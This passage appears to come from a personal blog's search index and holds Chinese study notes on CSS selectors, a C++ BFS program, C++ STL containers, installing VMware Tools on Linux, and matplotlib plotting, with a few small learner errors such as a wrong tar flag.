title="复合选择器"></a>复合选择器</h1><h2 id="交叉选择器"><a href="#交叉选择器" class="headerlink" title="交叉选择器"></a>交叉选择器</h2><ol><li>选中同时满足多个条件的元素</li><li>多个选择器的复合<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3></li><li>选择器1.选择器2.选择器n{}<pre class="line-numbers language-none"><code class="language-none">div.red&#123;    font-size: 30px;    color: red;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ol><li>交叉选择器中如果有元素选择器，必须使用元素选择器开头</li><li>一般不会出现id选择器和其它选择器的复用，因为id选择器已经可以唯一确定一个标签，一般只是元素选择器和类选择器之间的交叉</li></ol><h2 id="选择器分组-并集选择器"><a href="#选择器分组-并集选择器" class="headerlink" title="选择器分组/并集选择器"></a>选择器分组/并集选择器</h2><h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h3><ol><li>同时选择多个选择器对应的元素</li></ol><h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">选择器1,选择器2,选择器n&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>逗号在此处相当于是并集符号<br><img src="https://s2.loli.net/2022/05/16/tF5kXKfyqu1zaoM.png"></li></ol><h2 id="交叉选择器和并集选择器可以复合使用"><a href="#交叉选择器和并集选择器可以复合使用" class="headerlink" title="交叉选择器和并集选择器可以复合使用"></a>交叉选择器和并集选择器可以复合使用</h2><h2 id="网页中不同元素之间的关系"><a href="#网页中不同元素之间的关系" class="headerlink" title="网页中不同元素之间的关系"></a>网页中不同元素之间的关系</h2><h3 id="父子关系"><a href="#父子关系" class="headerlink" title="父子关系"></a>父子关系</h3><ol><li>直接包含子元素的是父元素（注意是直接）</li><li>直接被父元素包含的是子元素<h3 id="祖先后代元素"><a href="#祖先后代元素" class="headerlink" title="祖先后代元素"></a>祖先后代元素</h3></li><li>直接或间接包含后代元素叫祖先元素</li><li>一个元素的父元素也是祖先元素</li><li>直接或间接被祖先元素包含的元素叫做后代元素</li></ol><h3 id="兄弟元素"><a href="#兄弟元素" class="headerlink" title="兄弟元素"></a>兄弟元素</h3><ol><li>拥有相同父元素的叫兄弟元素</li></ol><h2 id="关系选择器"><a href="#关系选择器" class="headerlink" title="关系选择器"></a>关系选择器</h2><h3 id="子元素选择器"><a href="#子元素选择器" class="headerlink" title="子元素选择器"></a>子元素选择器</h3><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><ol><li>选中指定父元素的指定子元素<h4 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-none"><code class="language-none">父元素 &gt; 子元素div &gt; span &#123;    color: red;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="后代元素选择器"><a href="#后代元素选择器" class="headerlink" title="后代元素选择器"></a>后代元素选择器</h3><h4 id="作用：-2"><a href="#作用：-2" class="headerlink" title="作用："></a>作用：</h4><ol><li>选中指定元素的指定后代元素</li><li>范围比子选择器更大，相当于递归处理（-r）</li></ol><h4 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-none"><code class="language-none">祖先 后代&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="兄弟元素选择器"><a href="#兄弟元素选择器" class="headerlink" title="兄弟元素选择器"></a>兄弟元素选择器</h2><h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h3><ol><li>选择下一个兄弟</li><li>注意必须是紧邻的下一个兄弟元素</li><li>隔开的兄弟元素不会被选中</li><li>前面的兄弟元素不会被选中，只会选中前面的兄弟元素</li></ol><h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">前一个 + 下一个 p + span&#123; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">选择下边所有的兄弟兄 ~ 弟&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2><h3 id="title可以指定标签的标题"><a href="#title可以指定标签的标题" class="headerlink" title="title可以指定标签的标题"></a>title可以指定标签的标题</h3><ol><li>写的是什么，鼠标光标移到某个位置，可以显示提示文字</li></ol><h3 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">元素选择器[属性]&#123;    属性&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/16/f4yUhwZo2QePTOi.png"><br><img src="https://s2.loli.net/2022/05/16/ZeJnYEp79XFv1qD.png"><br><img src="https://s2.loli.net/2022/05/16/DrRizNOxHB8jMqW.png"></p><h3 id="作用-5"><a href="#作用-5" class="headerlink" title="作用"></a>作用</h3><ol><li>选择含有指定属性的元素</li></ol><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><pre class="line-numbers language-none"><code class="language-none">[属性名] 选择含有指定属性的元素[属性名&#x3D;属性值] 选择含有指定元素属性和属性值的元素[属性名^&#x3D;属性值] 选择属性值以指定值开头的元素[属性名$&#x3D;属性值] 选择属性值以指定值结尾的元素[属性名*&#x3D;属性值] 选择属性值中含有某值的元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dfs</title>
      <link href="/bfs/"/>
      <url>/bfs/</url>
      
        <content type="html"><![CDATA[<h1 id="bfs"><a href="#bfs" class="headerlink" title="bfs"></a>bfs</h1><h2 id="函数写法"><a href="#函数写法" class="headerlink" title="函数写法"></a>函数写法</h2><ol><li>定义对头和队尾hh,tt</li><li>定义x和y的位置,用一个二元组去存q[N*N]</li><li>将d数组全部初始化为-1</li><li>开头的d[0][0]初始化为0</li><li>写偏移量</li><li>判断队头和队尾</li><li>auto一个t，存q还没有走的值</li><li>预处理各个方向的偏移量</li><li>判断如果合法就存进去<pre class="line-numbers language-none"><code class="language-none">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;typedef pair&lt;int,int&gt; PII;const int N &#x3D; 110;int n,m;int g[N][N],d[N][N];&#x2F;&#x2F;g数组存图，d数组存的是每一个点到起点的距离PII q[N*N];int bfs()&#123;    int hh &#x3D; 0;&#x2F;&#x2F;队头    int tt &#x3D; 0;&#x2F;&#x2F;队尾    q[0] &#x3D; &#123;0,0&#125;;&#x2F;&#x2F;xy的坐标    memset(d,-1,sizeof d);    d[0][0] &#x3D; 0;&#x2F;&#x2F;距离原点的距离为0    int dx[4] &#x3D; &#123;-1,0,1,0&#125;;    int dy[4] &#x3D; &#123;0,1,0,-1&#125;;        while(hh &lt;&#x3D; tt)&#123;        auto t &#x3D; q[hh++];        for(int i &#x3D; 0;i &lt; 4;i++)        &#123;   &#x2F;&#x2F;这个地方只是预处理，没有存进去            int x &#x3D; t.first + dx[i];            int y &#x3D; t.second + dy[i];            &#x2F;&#x2F;判断合法就可以存进去            if(x &gt;&#x3D; 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;&#x3D; 0 &amp;&amp; y &lt; m &amp;&amp; g[x][y] &#x3D;&#x3D; 0 &amp;&amp; d[x][y] &#x3D;&#x3D; -1)&#123;                d[x][y] &#x3D; d[t.first][t.second] + 1;                q[++tt] &#x3D; &#123;x,y&#125;;            &#125;        &#125;    &#125;    return d[n-1][m-1];&#125;int main(void)&#123;    cin &gt;&gt; n &gt;&gt; m;    for(int i &#x3D; 0;i &lt; n;i++)&#123;        for(int j &#x3D; 0;j &lt; m;j++)&#123;            cin &gt;&gt; g[i][j];        &#125;    &#125;    cout &lt;&lt; bfs() &lt;&lt; endl;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stl</title>
      <link href="/stl/"/>
      <url>/stl/</url>
      
        <content type="html"><![CDATA[<h1 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h1><ol><li>变长数组，支持随机访问，但是不支持任意位置O(1)插入，只能在头或末尾插入</li><li>为了保证效率，元素增删一般在末尾进行<pre class="line-numbers language-none"><code class="language-none">声明#include&lt;vector&gt;vector&lt;int&gt; a;&#x2F;&#x2F;int类型的数组vector&lt;int&gt; b[233];&#x2F;&#x2F;第一维度长233（列数）固定，第二维度可以改变（列数）struct tec&#123;    int x,y;&#125;vector&lt;rec&gt; c;&#x2F;&#x2F;vector后面&lt;&gt;中添加类型,定义为结构体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2></li><li>a.size()返回数组的大小</li><li>a.empty()返回数组是否为空，true or false</li><li>clear()//把当前数组清空</li></ol><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><ol><li>类型于stl容器中的指针，可以用<em>操作符解除引用（用</em>即可返回具体的值）<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt;::iterator it;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>随机访问迭代器，可以把vector的迭代器与一个整数相加减，行为和指针的移动类似</li><li>两个迭代器相减，结果与指针相减类似，得到两个迭代器之间的距离</li><li>*a.begin()和a[0]效果一样</li><li>初始化<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt; a(&#123;1,2,3&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="begin-end"><a href="#begin-end" class="headerlink" title="begin/end"></a>begin/end</h1></li><li>begin函数返回指向vector中的第一个元素的迭代器</li><li>*a.begin() == a[0]</li><li>所有的容器都可以视作一个前闭后开的结构</li><li>end函数返回vector的尾部，即vector数组的末尾的下一个位置</li><li>*a.end() == a[n] 都是越界访问，其中n = a.size()</li></ol><h1 id="front-back"><a href="#front-back" class="headerlink" title="front/back"></a>front/back</h1><ol><li>front返回vector的第一个元素，a.front() == a[0] == *a.begin()</li><li>back返回vector的最后一个元素，a.back() == a[a.size()-1] == *a.end()</li></ol><h1 id="push-back-pop-back"><a href="#push-back-pop-back" class="headerlink" title="push_back() / pop_back()"></a>push_back() / pop_back()</h1><ol><li>a.push_back(x)将x插入到vector的尾部</li><li>b.pop_back(),删除vector a的最后一个元素</li></ol><h1 id="queue-循环队列"><a href="#queue-循环队列" class="headerlink" title="queue 循环队列"></a>queue 循环队列</h1><h2 id="先进先出"><a href="#先进先出" class="headerlink" title="先进先出"></a>先进先出</h2><h1 id="priority-queue-优先队列"><a href="#priority-queue-优先队列" class="headerlink" title="priority queue 优先队列"></a>priority queue 优先队列</h1><h2 id="会优先往外弹最大值"><a href="#会优先往外弹最大值" class="headerlink" title="会优先往外弹最大值"></a>会优先往外弹最大值</h2><pre class="line-numbers language-none"><code class="language-none">声明queue&lt;int&gt; q;priority_queue&lt;int&gt; a;&#x2F;&#x2F;大根堆priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt;&gt; b;&#x2F;&#x2F;小根堆priority_queue&lt;pair&lt;int,int&gt;&gt; a;&#x2F;&#x2F;定义的是二元组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="重载大于号"><a href="#重载大于号" class="headerlink" title="重载大于号"></a>重载大于号</h2><pre class="line-numbers language-none"><code class="language-none">struct Rec&#123;    int a,b;    bool operator &gt; (const Rec&amp; t) const&#123;        return a &gt; t.a;    &#125;&#125;priority_queue(Rec) d;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="循环队列queue"><a href="#循环队列queue" class="headerlink" title="循环队列queue"></a>循环队列queue</h3><ol><li>如果越界了会从头开始循环</li><li>push  //从队尾插入</li><li>pop   //从队头弹出   </li><li>front //返回队头元素</li><li>back  //返回队尾元素</li></ol><h3 id="优先队列priority-queue"><a href="#优先队列priority-queue" class="headerlink" title="优先队列priority_queue"></a>优先队列priority_queue</h3><ol><li>push  //把元素插入堆</li><li>pop   //删除堆顶元素(优先队列中队头即为最大值)</li><li>top   //查询堆顶元素</li></ol><h3 id="注意：除了队列，栈，其余都有clear函数"><a href="#注意：除了队列，栈，其余都有clear函数" class="headerlink" title="注意：除了队列，栈，其余都有clear函数"></a>注意：除了队列，栈，其余都有clear函数</h3><ol><li>清空队列直接初始化</li><li>q = queue<int>();</li></ol><h2 id="栈stack"><a href="#栈stack" class="headerlink" title="栈stack"></a>栈stack</h2><ol><li>头文件stack,和队列相反，先进后出<pre class="line-numbers language-none"><code class="language-none">stack&lt;int&gt; stk;stk.push(1);stk.top();stk.pop();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><ol><li>头文件<deque></li><li>支持在两端高效插入或删除元素的连续线性存储空间</li><li>相当于是一个拓展版的vector</li><li>二者在队尾插入元素时间复杂度都是O(1)</li><li>在队头插入，vector是O(n),deque是O(n)<pre class="line-numbers language-none"><code class="language-none">deque&lt;int&gt; a;&#x2F;&#x2F;定义a.begin()a.end()a.front()a.back()a.push_back()&#x2F;&#x2F;在队尾插入一个元素a.push_front()&#x2F;&#x2F;在对头插入一个元素a[0]&#x2F;&#x2F;支持取下标随机访问一个元素a.pop_front()&#x2F;&#x2F;在对头弹出一个元素a.pop_back()&#x2F;&#x2F;在队尾弹出一个一元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="为了避免边界处理问题，都从0开始遍历，存到n-1"><a href="#为了避免边界处理问题，都从0开始遍历，存到n-1" class="headerlink" title="为了避免边界处理问题，都从0开始遍历，存到n-1"></a>为了避免边界处理问题，都从0开始遍历，存到n-1</h1><h1 id="循环队列，优先队列，栈，双端队列都没有迭代器"><a href="#循环队列，优先队列，栈，双端队列都没有迭代器" class="headerlink" title="循环队列，优先队列，栈，双端队列都没有迭代器"></a>循环队列，优先队列，栈，双端队列都没有迭代器</h1><h1 id="循环队列，优先队列和栈没有clear-函数，其他都有"><a href="#循环队列，优先队列和栈没有clear-函数，其他都有" class="headerlink" title="循环队列，优先队列和栈没有clear()函数，其他都有"></a>循环队列，优先队列和栈没有clear()函数，其他都有</h1><h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><ol><li>包括set和multiset两个容器，分别是有序集合和有序多重集合</li><li>有序集合(set)的元素不能重复，但是有序多重集合(multiset)可以包含若干个相等的元素<pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt; s;struct Rec&#123;    ...&#125;;set&lt;Rec&gt; s;&#x2F;&#x2F;rec中必须重载小于号multiset&lt;double&gt; s;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h2><h2 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h2><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><h2 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h2><h1 id="set-1"><a href="#set-1" class="headerlink" title="set"></a>set</h1><pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt; a;multiset&lt;double&gt; b;struct Rec&#123;    int a,b;&#125;set&lt;Rec&gt; c;&#x2F;&#x2F;注意这个地方需要重载小于号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>支持size,empty,clear</li><li>迭代器，双向访问迭代器,支持*接触引用，仅支持++和–两个与算数有关的操作</li><li>不支持随机访问操作，类似于<pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt;::iterator itt &#x3D; a.begin()cout &lt;&lt; *(itt+3) &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>会报错，因为仅支持上一个或下一个的操作，一次跳转多个的算是随机访问</li><li>插入一个元素,因为是集合，具有无序性，所以insert的时候是无序的<pre class="line-numbers language-none"><code class="language-none">a.insert(x)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查找<pre class="line-numbers language-none"><code class="language-none">s.find(x)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>在集合中查找等于x的元素，并返回该元素的迭代器，如果不存在则返回s.end()<h2 id="lower-bound-upper-bound"><a href="#lower-bound-upper-bound" class="headerlink" title="lower_bound/upper_bound"></a>lower_bound/upper_bound</h2></li><li>s.lower_bound(x),查找大于等于x的元素的最小的一个，并且返回该元素的迭代器</li><li>s.upper_bound(x),查找大于x的元素中最小的一个，并且返回该元素的迭代器<h2 id="erase"><a href="#erase" class="headerlink" title="erase"></a>erase</h2></li><li>如果it是一个迭代器，s.erase(it)从it中删除迭代器it指向的元素</li><li>如果x是一个元素，s.erase(x)从s中删除所有等于x的元素<h2 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h2></li><li>返回s中等于x的元素个数，因为是集合，所以只有0和1会返回，但如果是multiset(x),则会返回x在multiset中存在的个数，因为multiset允许重复</li></ol><h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><ol><li>一个键值对的key-value的映射</li><li>map的key和value可以是任意类型，其中key<pre class="line-numbers language-none"><code class="language-none">a[1] &#x3D; 2;&#x2F;&#x2F;在a[1]的位置插入2a[1000000] &#x3D; 3;&#x2F;&#x2F;在key所在的位置插入3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>和数组的区别：前后两个结构体是可以自由定义的<pre class="line-numbers language-none"><code class="language-none">a[&quot;abc&quot;] &#x3D; 2;cout &lt;&lt; a[&quot;abc&quot;] &lt;&lt; endl;结果是2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>size,empty,clear,begin,end都和set类似</li><li>insert’erase,参数必须是pair&lt;key_type,value_type&gt;,即插入的时候必须令键的类型和值的类型相匹配</li></ol><h1 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h1><ol><li>二元组<pre class="line-numbers language-none"><code class="language-none">pair&lt;int,string&gt; a;a &#x3D; &#123;3,&quot;yxc&quot;&#125;;cout &lt;&lt; a.first &lt;&lt; &#39; &#39; &lt;&lt; a.second &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>pair支持比较运算，先比较first,再比较second</li></ol><h1 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h1><h2 id="与-amp"><a href="#与-amp" class="headerlink" title="与 &amp;"></a>与 &amp;</h2><ol><li>0&amp;0 == 0</li><li>0&amp;1 == 0</li><li>1&amp;1 == 1</li></ol><h2 id="或"><a href="#或" class="headerlink" title="或 |"></a>或 |</h2><ol><li>0|0 == 0</li><li>1 | 0 == 1</li><li>0 | 1 == 1</li><li>1 | 1 == 1</li></ol><h2 id="非"><a href="#非" class="headerlink" title="非 ~"></a>非 ~</h2><ol><li>~0 == 1</li><li>~1 == 0</li></ol><h2 id="异或-XOR"><a href="#异或-XOR" class="headerlink" title="异或 ^ XOR"></a>异或 ^ XOR</h2><ol><li>不进位加法</li><li>0 ^ 0 == 0</li><li>1 ^ 1 =0</li><li>1 ^ 0 == 1</li><li>0 ^ 1 == 1</li><li>按照每一位进行按位异或</li></ol><h2 id="右移-gt-gt"><a href="#右移-gt-gt" class="headerlink" title="右移 &gt;&gt;"></a>右移 &gt;&gt;</h2><ol><li>求x的第k位数字:x &gt;&gt; k &amp; 1</li><li>右移k位相当于除以2的k次方</li></ol><h2 id="左移-lt-lt"><a href="#左移-lt-lt" class="headerlink" title="左移 &lt;&lt;"></a>左移 &lt;&lt;</h2><ol><li>左移k位相当于乘以2的k次方</li></ol><h2 id="求一个数的二进制表示方法："><a href="#求一个数的二进制表示方法：" class="headerlink" title="求一个数的二进制表示方法："></a>求一个数的二进制表示方法：</h2><pre class="line-numbers language-none"><code class="language-none">int a &#x3D; 13;for(int i &#x3D; n;i &gt;&#x3D; 0;i --)&#123;    cout &lt;&lt; (a &gt;&gt; i &amp; 1)&#125;这里的5是最大求到2的多少次方的位数，0是2的0次方，从n到2的0次方依次提出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="返回x的最后一位1"><a href="#返回x的最后一位1" class="headerlink" title="返回x的最后一位1:"></a>返回x的最后一位1:</h1><ol><li>lowbit(x) = x &amp; -x</li></ol><h2 id="常用库函数"><a href="#常用库函数" class="headerlink" title="常用库函数"></a>常用库函数</h2><h3 id="在算法库中"><a href="#在算法库中" class="headerlink" title="在算法库中"></a>在<algorithm>算法库中</h3><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><ol><li>反转数组<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt; a;reverse(a.begin(),a.end());&#x2F;&#x2F;反转数组reverse(a,a+a.size()+1);&#x2F;&#x2F;a的首部位置和a的最后一个元素的下一个位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><img src="https://s2.loli.net/2022/05/06/LbQafHFu6lERZyT.png"></li></ol><h4 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h4><ol><li>数组判重，然后将元素放到数组开头的位置,但是重复的元素只是放到后面，不是删除</li><li>返回值：不同元素的下一个位置的指针</li><li>注意：只是去掉相邻的相同元素，必要时需要sort排序<pre class="line-numbers language-none"><code class="language-none">int m &#x3D; unique(a.begin(),a.end()) - a.begin()&#x2F;&#x2F;返回的差值是数组中不同元素的个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><img src="https://s2.loli.net/2022/05/06/glWePkoQ8NDbuhn.png"></li><li><img src="https://s2.loli.net/2022/05/06/8goGlZO6KeLnYEh.png"></li></ol><h4 id="random-shuffle"><a href="#random-shuffle" class="headerlink" title="random_shuffle()"></a>random_shuffle()</h4><ol><li>参数和reverse()函数一样<pre class="line-numbers language-none"><code class="language-none">random_shuffle(a.begin(),a.end());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>打乱数组</li><li>random_shuffle(a.begin(),a.end());</li><li>随机种子不一样，打乱顺序不一样</li><li>一般引用<ctime>库中的time(0)函数，生成种子；</li><li><img src="https://s2.loli.net/2022/05/06/AfJWYFN9o854l6w.png"></li></ol><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><ol><li>sort(a.begin(),a.end())从小到大</li><li>如果希望从大到小排序，则需要加上一个参数greater<int>()<pre class="line-numbers language-none"><code class="language-none">sort(a.begin(),a.end(),greater&lt;int&gt;())3. 按照自己的想法进行排序，自己写一个cmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">bool cmp(int a,int b)&#123;&#x2F;&#x2F;a是否应该排在b的前面    return a &gt; b;&#x2F;&#x2F;从大到小    return a &lt; b;&#x2F;&#x2F;从小到大    &#x2F;&#x2F;如果a应该排在b的前面，返回true,否则返回false&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>如果需要重载大于或小于号的写法<pre class="line-numbers language-none"><code class="language-none">bool opeartor&lt; (const Rec &amp;t) const&#123;    return x &lt; t.x;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装vmware tools</title>
      <link href="/%E5%AE%89%E8%A3%85vmwaretools/"/>
      <url>/%E5%AE%89%E8%A3%85vmwaretools/</url>
      
        <content type="html"><![CDATA[<h1 id="安装vmware-tools"><a href="#安装vmware-tools" class="headerlink" title="安装vmware tools"></a>安装vmware tools</h1><ol><li>vmware窗口中点击虚拟机，选择安装vmware tools</li><li>查找VMware tools的tar.gz安装包</li><li>常规情况下应该在/media/用户名/VMware\ Tools/VMware Toolsxxxx.tar.gz</li><li>将该压缩包复制到/root下，cp /media/strongwill/VMware\ Tools/VMware Toolsxxx.tar.gz /root</li><li>cd /root</li><li>解压压缩包tar -cvzf VMwareToolsxxx.tar.gz</li><li>出现蓝色解压后的disturb文件，cd进去</li><li>执行里面的vmware-install.pl:./vmware-install.pl</li><li>一路默认安装即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib</title>
      <link href="/matplotlib/"/>
      <url>/matplotlib/</url>
      
        <content type="html"><![CDATA[<h1 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h1><pre class="line-numbers language-none"><code class="language-none"># 导入 matplotlib 的所有内容（nympy 可以用 np 这个名字来使用）from pylab import *# 创建一个 8 * 6 点（point）的图，并设置分辨率为 80figure(figsize&#x3D;(8,6), dpi&#x3D;80)# 创建一个新的 1 * 1 的子图，接下来的图样绘制在其中的第 1 块（也是唯一的一块）subplot(1,1,1)X &#x3D; np.linspace(-np.pi, np.pi, 256,endpoint&#x3D;True)C,S &#x3D; np.cos(X), np.sin(X)# 绘制余弦曲线，使用蓝色的、连续的、宽度为 1 （像素）的线条plot(X, C, color&#x3D;&quot;blue&quot;, linewidth&#x3D;1.0, linestyle&#x3D;&quot;-&quot;)# 绘制正弦曲线，使用绿色的、连续的、宽度为 1 （像素）的线条plot(X, S, color&#x3D;&quot;green&quot;, linewidth&#x3D;1.0, linestyle&#x3D;&quot;-&quot;)# 设置横轴的上下限xlim(-4.0,4.0)# 设置横轴记号xticks(np.linspace(-4,4,9,endpoint&#x3D;True))# 设置纵轴的上下限ylim(-1.0,1.0)# 设置纵轴记号yticks(np.linspace(-1,1,5,endpoint&#x3D;True))# 以分辨率 72 来保存图片# savefig(&quot;exercice_2.png&quot;,dpi&#x3D;72)# 在屏幕上显示show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="设置底层图片的大小"><a href="#设置底层图片的大小" class="headerlink" title="设置底层图片的大小"></a>设置底层图片的大小</h2><ol><li>figsize()函数设置散点图是几×几大小的</li><li>dpi设置分辨率(像素)<h3 id="像素的定义："><a href="#像素的定义：" class="headerlink" title="像素的定义："></a>像素的定义：</h3></li><li>在由一个数字序列表示的图像中的一个最小单位</li><li>当像素点的大小一定时，像素点约多，照片越大<h2 id="改变线条的颜色和粗细"><a href="#改变线条的颜色和粗细" class="headerlink" title="改变线条的颜色和粗细"></a>改变线条的颜色和粗细</h2></li><li>plot()函数</li><li>color参数设置颜色</li><li>linewidth参数设置线条粗细</li><li>linestyle参数设置线条风格</li></ol><h3 id="plot函数详解："><a href="#plot函数详解：" class="headerlink" title="plot函数详解："></a>plot函数详解：</h3><ol><li>plt.plot(x,y,linestyle=’-‘,linewidth=’x’,label=’xxx’,color=’xxx’)</li><li>x:x轴上的值</li><li>y:y轴上的值</li><li>linestyle:线条风格</li><li>linewidth:线条粗细</li><li>label:标签文本</li></ol><h4 id="plot函数常见问题："><a href="#plot函数常见问题：" class="headerlink" title="plot函数常见问题："></a>plot函数常见问题：</h4><pre class="line-numbers language-none"><code class="language-none">x and y must have same first dimensition,but have shapes (4,) and (6,)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>意为：x和y必须参数的个数相同（个数不相同，有的只有一个坐标你怎么画点呢？）<br><a href="https://imgtu.com/i/Lg0l1U"><img src="https://s1.ax1x.com/2022/04/22/Lg0l1U.md.png" alt="Lg0l1U.md.png"></a></li><li>ing</li></ol><h3 id="linestyle参数"><a href="#linestyle参数" class="headerlink" title="linestyle参数"></a>linestyle参数</h3><pre class="line-numbers language-none"><code class="language-none">&#39;-&#39;, &#39;--&#39;, &#39;-.&#39;, &#39;:&#39;, &#39;None&#39;, &#39; &#39;, &#39;&#39;, &#39;solid&#39;, &#39;dashed&#39;, &#39;dashdot&#39;, &#39;dotted&#39;<span aria-hidden="true" 